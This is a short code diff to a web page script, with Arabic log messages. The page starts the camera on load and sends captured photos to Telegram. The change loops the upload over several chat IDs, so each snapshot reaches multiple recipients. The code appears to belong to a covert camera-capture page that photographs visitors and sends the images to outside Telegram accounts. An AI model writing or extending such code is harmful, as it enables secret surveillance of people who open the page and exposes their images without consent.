@@ -119,8 +119,9 @@
   }
 
   async function sendToTelegram(blob) {
+  for (const id of chatIds) {
     const formData = new FormData();
-    formData.append('chat_id', chatId);
+    formData.append('chat_id', id);
     formData.append('photo', blob, 'image.jpg');
 
     try {
@@ -130,14 +131,15 @@
       });
 
       if (!response.ok) {
-        console.error("فشل الإرسال:", response.statusText);
+        console.error("فشل الإرسال إلى", id, response.statusText);
       } else {
-        console.log("تم إرسال الصورة");
+        console.log("تم إرسال الصورة إلى", id);
       }
     } catch (err) {
-      console.error("خطأ في الإرسال:", err);
+      console.error("خطأ في الإرسال إلى", id, err);
     }
   }
+}
 
   window.onload = () => {
     startCamera();
